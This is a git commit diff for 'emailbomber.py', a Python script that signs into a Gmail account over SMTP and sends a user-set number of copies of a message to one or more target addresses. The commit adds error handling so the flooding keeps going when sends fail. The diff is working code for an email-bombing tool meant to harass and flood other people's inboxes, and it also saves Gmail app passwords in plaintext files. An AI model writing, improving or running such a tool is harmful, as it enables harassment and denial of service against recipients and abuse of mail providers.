8cea503300a4d9a6d4c9e2d523e92d07224834de
Kuba Krakowski <kubakrakowski@outlook.com>
2022-10-14 10:16:22 +0200

    Adding some error handling.

--- emailbomber.py
+++ emailbomber.py
@@ -1,6 +1,6 @@
 #Built-in library's.
 import smtplib
-from os import path, mkdir
+from os import access, path, mkdir
 
 print(f"{open('Welcome/welcome.txt', encoding='UTF-8').read()}\n\n") #Welcomes user.
 
@@ -14,8 +14,12 @@ else: #Otherwise, reads saved user credentials.
 print("If you would like to spam more than one email, separate the emails by commas (example@gmail.com, example2@hotmail.com, example3@myspace.com)") #Tells user how to email-bomb more than one email.
 receiver = input("Specify the email(s) you would like to email-bomb -> ") #Enter the email(s) that you would like to email-bomb.
 message = input("Enter your email-bomber message -> ") #The message that the email user(s) will receive.
-count = int(input("Enter a number for the amount of emails to be sent -> ")) #The amount of emails to be sent to the receiver(s).
-
+try:
+    count = int(input("Enter a number for the amount of emails to be sent -> ")) #The amount of emails to be sent to the receiver(s).
+except ValueError:
+    print("Please enter a number for the amount of emails to be sent.")
+    input("Press enter to exit.")
+    quit()
 #Server
 server = smtplib.SMTP("smtp.gmail.com",587) #Initializes SMTP server.
 server.starttls() #Start SMTP server.
@@ -28,19 +32,28 @@ except smtplib.SMTPAuthenticationError as error: #Incorrect credentials inputted
     input("Enter to exit...")
     quit() #Quits program.
 
-if not path.exists("User_Credentials"): #If user credentials does not exist, creates and saves credential files.
-    #If there are no errors in credentials, save user information after SMTP verification.
-    mkdir("User_Credentials") #Creats User_Credentials folder.
-    open("User_Credentials/sender.txt", "xt").write(sender) #Creates and saves user's Gmail address to User_Credentials folder.
-    open("User_Credentials/app_password.txt", "xt").write(app_password) #Creates and saves user's Gmail app password to User_Credentials folder.
-    input("\nYour credentials have been saved, so you do not have to repeat this process.\nTo change your credentials, go to User_Credentials and change your file information.\nPress enter to continue...")
+try:
+    if not path.exists("User_Credentials"): #If user credentials does not exist, creates and saves credential files.
+        #If there are no errors in credentials, save user information after SMTP verification.
+        mkdir("User_Credentials") #Creats User_Credentials folder.
+        open("User_Credentials/sender.txt", "xt").write(sender) #Creates and saves user's Gmail address to User_Credentials folder.
+        open("User_Credentials/app_password.txt", "xt").write(app_password) #Creates and saves user's Gmail app password to User_Credentials folder.
+        input("\nYour credentials have been saved, so you do not have to repeat this process.\nTo change your credentials, go to User_Credentials and change your file information.\nPress enter to continue...")
+except OSError: #Operating system error.
+    print("\nError:\nThere was an error saving your credentials.")
 
 print("\nEmail-bomber has started...\n")
 
 for i in range(count): #Amount of messages to be sent.
     for email_receiver in receiver.split(","): #Loops through emails to send emails to.
-        server.sendmail(from_addr= sender, to_addrs=email_receiver, msg=message) #Sends email to receiver.
-        print(f"Email-bombing {email_receiver}...")
+        try:   
+            print(f"Email-bombing {email_receiver}...")     
+            server.sendmail(from_addr= sender, to_addrs=email_receiver, msg=message) #Sends email to receiver.
+            print("Email sent successfully!")
+        except smtplib.SMTPException as error:
+            print(f"Error:\n{error}")
+            continue
+
 
 input("\nEmail-bomber was successful...\nEnter to exit...") #Email-bomber finished.
 server.close() #Closes server.
